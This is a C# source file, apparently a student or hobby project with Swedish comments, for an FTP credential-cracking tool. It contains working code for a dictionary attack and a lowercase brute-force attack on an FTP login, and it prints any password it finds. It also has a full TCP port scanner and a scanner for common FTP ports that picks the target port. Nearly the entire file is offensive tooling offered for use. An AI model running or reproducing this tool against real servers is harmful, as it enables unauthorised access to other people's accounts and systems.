using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace BF
{

    public class AutomaticAttacks
    {
        static string[] characters = "a b c d e f g h i j k l m n o p q r s t u v w x y z".Split(' ');
        static string username;
        static string IP;
        static int port;
        static string dictionaryLocation;

        //FtpPropeties is used to set values to the IP, port, username and lenght variables
        public static string AutoMaticFtpProperties()
        {
            Console.Write("Ange önskat användarnamn: ");
            username = Console.ReadLine();

            Console.WriteLine("Enter location to dictionary: ");
            dictionaryLocation = Console.ReadLine();

            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("===========================================");
            Console.ResetColor();

            return null;
        }

        //Dictionary Attack method
        public static bool AutoMaticDictionaryAttack()
        {

            



            try
            {
                //StreamReadern läser in sökvägen till textfilen med lösenorden
                using (StreamReader sr = new StreamReader(dictionaryLocation))
                {
                    //Läser in hela textfilen, lagrar den i en array och splittar sedan ord för ord.
                    string line = sr.ReadToEnd();
                    string[] words = line.Split();

                    //prövar varje ord som lösenord från arrayen "words"
                    foreach (var word in words)
                    {

                        if (Console.KeyAvailable && Console.ReadKey(true).Key == ConsoleKey.Escape)
                        {
                            Console.WriteLine("Exiting");
                            break;
                        }
                        ftp Ftp = new ftp("ftp://" + IP, port, username, word);
                        Console.WriteLine(word);
                        if (Ftp.LoginCheck())
                        {
                            Console.ForegroundColor = ConsoleColor.Yellow;
                            Console.ResetColor();
                            Console.ForegroundColor = ConsoleColor.DarkGreen;
                            Console.WriteLine("Connected to the server");
                            Console.ResetColor();
                            Console.ForegroundColor = ConsoleColor.DarkMagenta;
                            Console.WriteLine("The password was: {0}", word);
                            Console.ForegroundColor = ConsoleColor.Yellow;
                            Console.WriteLine("=======================");
                            Console.ResetColor();
                            Program.ContinueOnKeyPressed();
                            Console.Clear();
                            Program.Main();
                        }
                        else
                        {
                            // Console.WriteLine("Fel lösenord");
                        }
                    }
                }
                //När scanningen är slut
                Console.ForegroundColor = ConsoleColor.DarkYellow;
                Console.WriteLine("===============================");
                Console.WriteLine("Finished with dictinary attacks");
                Console.WriteLine("===============================");
                Console.ResetColor();

                //Om attacken misslyckades och inget lösenord hittades hamnar vi här nedan
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("No password found..");
                Console.ResetColor();

            }
            catch (Exception)
            {
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("========================================================");
                Console.ResetColor();
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Kunde inte hitta sökvägen..");
                Console.WriteLine("Har du glömt att specificera filformatet på textfilen..?");
                Console.ResetColor();
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("========================================================");
                Console.ResetColor();
            }
            return false;
        }




        public static void brute()
        {
            var Pattern = new List<string>() { "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z" };
            Combinator<string> Combinator = new Combinator<string>(Pattern);


            while (Combinator.HasFinised == false)
            {
                if (Console.KeyAvailable && Console.ReadKey(true).Key == ConsoleKey.Escape)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("===========================");
                    Console.WriteLine("Exiting");
                    Console.WriteLine("===========================");
                    Console.ResetColor();
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine("Brute Force ended..");
                    Console.ResetColor();
                    Console.WriteLine("Press any key to go back to the menu");
                    Console.ReadLine();
                    break;
                }

                Thread.Sleep(50);
                var Combined = Combinator.Next();
                var Joined = string.Join("", Combined);
                Console.WriteLine(Joined);
                ftp Ftp = new ftp("ftp://" + IP, port, username, Joined);

                if (Ftp.LoginCheck())
                {
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.ResetColor();
                    Console.ForegroundColor = ConsoleColor.DarkGreen;
                    Console.WriteLine("Connected to the server");
                    Console.ResetColor();
                    Console.ForegroundColor = ConsoleColor.DarkMagenta;
                    Console.WriteLine("The password was: {0}", Joined);
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine("=======================");
                    Console.ResetColor();
                    Program.ContinueOnKeyPressed();
                    Console.Clear();
                    break;
                }
            }
            Program.Main();
        }









        static bool ScanPort(IPAddress Address, int Port)
        {
            TcpClient Client = new TcpClient();
            try
            {
                // Försöker ansluta till den angivna adressen samt porten. 
                Client.Connect(Address, Port);

                //Stäng strömmen
                NetworkStream ClientStream = Client.GetStream();
                ClientStream.Close();

                //Stäng TCP anslutningen
                Client.Close();
            }
            catch (SocketException)
            {
                //Antag att socket excaption betyder att anslutningen misslyckades och därför 
                //är anslutningen misslyckad.
                return false;
            }
            return true;
        }



        static void PortScan()
        {
            string ScanAddress;
            IPAddress ScanIPAddress;
            Console.WriteLine("Enter IP Address: ");
            ScanAddress = Console.ReadLine();

            try
            {

                ScanIPAddress = IPAddress.Parse(ScanAddress);

                Console.WriteLine("Port scanning {0} ({1})", ScanAddress, ScanIPAddress.ToString());

                //Räknare för öppna respektive stängda portar.
                int count = 0;
                int cPorts = 0;

                //Loopar igenom och scannar alla portar
                for (int Port = IPEndPoint.MinPort; Port < IPEndPoint.MaxPort; Port++)
                {
                    Console.Write("Scanning port {0}: ", Port);
                    if (ScanPort(ScanIPAddress, Port))
                    {
                        Console.ForegroundColor = ConsoleColor.DarkGreen;
                        Console.WriteLine("OPEN");
                        Console.ResetColor();
                        count++;
                    }
                    else
                    {
                        Console.ForegroundColor = ConsoleColor.DarkRed;
                        Console.WriteLine("CLOSED");
                        Console.ResetColor();
                        cPorts++;
                    }
                }



                //När scanningen är slut
                Console.ForegroundColor = ConsoleColor.DarkYellow;
                Console.WriteLine("============================");
                Console.WriteLine("Finished scanning all ports");
                Console.WriteLine("============================");
                Console.ResetColor();
                Console.WriteLine("Open ports: {0},", count);
                Console.WriteLine("Closed ports: {0},", cPorts);

                Console.ReadLine();

                Program.Menu();
            }
            //Om error skulle uppstå.
            catch (Exception)
            {
                Console.WriteLine("Exception caught!");
            }
        }


        //Metod som scannar av specifika portar som FTP servern vanligtvis använder.
        public static void AutoMaticPortScanSpecific()
        {
            string ScanAddress;
            IPAddress ScanIPAddress;
            Console.WriteLine("Enter IP to the FTP Server: ");
            ScanAddress = Console.ReadLine();
            IP = ScanAddress;

            try
            {
                ScanIPAddress = IPAddress.Parse(ScanAddress);

                Console.WriteLine("Port scanning {0} ({1})", ScanAddress, ScanIPAddress.ToString());

                //Räknare för öppna respektive stängda portar.
                int count = 0;
                int cPorts = 0;
                int oPorts = 0;



                //portar att scanna
                List<int> ports = new List<int> { 20, 21, 22, 47, 69, 115, 152, 989, 990, 2121, 2811, 3305, 4993, 5402 };

                //Loopar igenom och scannar alla portar
                foreach (int port in ports)
                {
                    Console.Write("Scanning port {0}: ", port);
                    if (ScanPort(ScanIPAddress, port))
                    {
                        Console.ForegroundColor = ConsoleColor.DarkGreen;
                        Console.WriteLine("OPEN");
                        Console.ResetColor();
                        oPorts = port;
                        count++;
                    }
                    else
                    {
                        Console.ForegroundColor = ConsoleColor.DarkRed;
                        Console.WriteLine("CLOSED");
                        Console.ResetColor();
                        cPorts++;
                    }
                }


                //När scanningen är slut
                Console.ForegroundColor = ConsoleColor.DarkYellow;
                Console.WriteLine("============================");
                Console.WriteLine("Finished scanning all ports");
                Console.WriteLine("============================");
                Console.ResetColor();
                Console.WriteLine("Open ports: {0},", count);
                Console.WriteLine("Closed ports: {0},", cPorts);

                if (count > 1)
                {
                    Console.WriteLine("Found {0} ports, choose 1 to use!", count);
                    port = int.Parse(Console.ReadLine());
                }
                else if (oPorts == 0)
                {
                    Console.WriteLine("No ports open! Will go for default port 21");
                    Thread.Sleep(3000);
                }
                else
                {
                    port = oPorts;
                }
            }
            //Om error skulle uppstå.
            catch (Exception)
            {
                Console.WriteLine("Exception caught!");
            }
        }
    }

}